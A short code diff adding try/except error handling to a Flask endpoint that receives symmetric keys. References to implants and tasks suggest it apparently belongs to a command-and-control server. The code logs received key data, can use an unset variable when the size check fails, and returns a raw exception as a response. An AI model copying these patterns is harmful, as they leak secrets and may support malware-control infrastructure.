@@ -274,8 +274,9 @@ def handle_passwords():
 @cross_origin()
 def new_symkey():
     print("Received response")
-    if (request.content_length < 256):
-        data = request.get_data()
+    try:
+        if (request.content_length < 256):
+            data = request.get_data()
         print(data)
         # print(len(data))
         datastr = data.decode("utf-8")
@@ -291,7 +292,11 @@ def new_symkey():
         print(data)
         print(str(data))
         print(jsonify(data))
-        
+        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL} 
+    except Exception as error:
+        print(error)
+        return error, {'Access-Control-Allow-Origin': config.clientURL} 
+
         """
         target_implant_id = data['target_implant_id']
         task_id = data['task_id']
